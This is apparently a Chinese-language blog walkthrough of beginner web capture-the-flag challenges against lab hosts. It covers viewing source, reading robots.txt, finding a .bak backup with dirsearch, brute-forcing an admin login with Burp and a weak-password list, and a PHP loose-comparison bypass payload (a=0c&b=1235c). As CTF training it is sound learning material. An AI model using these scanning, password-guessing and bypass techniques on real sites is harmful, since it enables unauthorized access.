        <content type="html"><![CDATA[<h3 id="1-view-source"><a href="#1-view-source" class="headerlink" title="1.view_source"></a>1.view_source</h3><p>查看网页源代码有三种方法：  </p><ol><li>最常见也最直接的办法：按F12打开开发者工具</li><li>题目也给了提示，在url前加view-source:url即可查看网页源代码，但这是早期的协议，现在只有谷歌和火狐支持，IE不支持  </li><li>使用python中requests库的requests.get()<img src="https://tremiy.github.io/2020/11/05/web%E6%96%B0%E6%89%8B/1.jpg">  </li></ol><h3 id="2-robots"><a href="#2-robots" class="headerlink" title="2.robots"></a>2.robots</h3><p>根据题目提示，访问该网页的robots协议<img src="https://tremiy.github.io/2020/11/05/web%E6%96%B0%E6%89%8B/2.jpg"><br>再根据网页返回提示访问<code>f1ag_1s_h3re.php</code>即可得flag  </p><h3 id="3-backup"><a href="#3-backup" class="headerlink" title="3.backup"></a>3.backup</h3><p>你知道index.php的备份文件名吗？<br>常见的备份文件扩展名有： .git .svn .swp .~ .bak<br>两种方法<br>第一种：一个个试，结果发现在地址栏输入<code>http://220.249.52.133:30247/index.php.bak</code>时会下载index.php.bak文件，用记事本打开即得flag<br>第二种，使用disearch命令<br>disearch下载命令：<br><code>git clone https://github.com/maurosoria/dirsearch</code>  </p><p>进入disearch目录并运行：<br><code>cd disearch</code><br><code>python3 dirsearch.py -u &quot;http://220.249.52.133:33501/&quot; -e *</code><br><img src="https://tremiy.github.io/2020/11/05/web%E6%96%B0%E6%89%8B/4.jpg"><br>可以看到有bak备份文件，于是可以确定index.php.bak是我们要找到，直接在地址栏输入<code>http://220.249.52.133:30247/index.php.bak</code>即可下载获得flag  </p><h3 id="4-cookie"><a href="#4-cookie" class="headerlink" title="4.cookie"></a>4.cookie</h3><p>直接F12打开开发者工具，看network，发现：<br><img src="https://tremiy.github.io/2020/11/05/web%E6%96%B0%E6%89%8B/5.jpg"><br>根据提示查看cookie.php<br><img src="https://tremiy.github.io/2020/11/05/web%E6%96%B0%E6%89%8B/6.jpg">  </p><h3 id="5-disabled-button"><a href="#5-disabled-button" class="headerlink" title="5.disabled_button"></a>5.disabled_button</h3><p>F12查看源码<img src="https://tremiy.github.io/2020/11/05/web%E6%96%B0%E6%89%8B/7.jpg"><br>发现disabled属性，<code>disabled</code>禁用input，使得按钮失效，删除即可摁下按钮得到flag<img src="https://tremiy.github.io/2020/11/05/web%E6%96%B0%E6%89%8B/8.jpg">   </p><h3 id="6-weak-auth"><a href="#6-weak-auth" class="headerlink" title="6.weak_auth"></a>6.weak_auth</h3><p>题目提示是弱口令，源码提示需要一本字典，且登陆后提示用户名为admin<br><img src="https://tremiy.github.io/2020/11/05/web%E6%96%B0%E6%89%8B/9.jpg"><br>用burp+弱口令字典跑出密码123456<img src="https://tremiy.github.io/2020/11/05/web%E6%96%B0%E6%89%8B/10.jpg"><br>登陆即得flag  </p><h3 id="7-simple-php"><a href="#7-simple-php" class="headerlink" title="7.simple_php"></a>7.simple_php</h3><pre><code>&lt;?phpshow_source(__FILE__);include(&quot;config.php&quot;);        $a=@$_GET[&#39;a&#39;];                $b=@$_GET[&#39;b&#39;];if($a==0 and $a){        //当a的值为0而a不为0时    echo $flag1;}if(is_numeric($b)){        //b是数字    exit();}if($b&gt;1234){            //b要＞1234    echo $flag2;}?&gt;</code></pre><p>php中==是值相等，===是严格相等（即值和类型都相等），这里要求a的值为0而a不为0，因此可以让a=0c（只要数字零后面接的是字母即可），则在判断==时会自动将a的类型转化为第一个字符的类型，在对值进行比较。<code>is_numeric</code>判断是否是数字，如果是则返回1，不是返回0，看代码我们知道，我们要让<code>is_numeric($b)</code>的值为0，否则程序会退出，且要求b的值大于1234，因此也是用数字+字母构造b。最终得出如下url：<br><code>http://220.249.52.133:59753/?a=0c&amp;&amp;b=1235c</code><br><img src="https://tremiy.github.io/2020/11/05/web%E6%96%B0%E6%89%8B/11.jpg">  </p><h3 id="8-get-post"><a href="#8-get-post" class="headerlink" title="8.get_post"></a>8.get_post</h3><p>利用firefox的hackbar工具<br><img src="https://tremiy.github.io/2020/11/05/web%E6%96%B0%E6%89%8B/12.jpg"><br><img src="https://tremiy.github.io/2020/11/05/web%E6%96%B0%E6%89%8B/13.jpg"></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
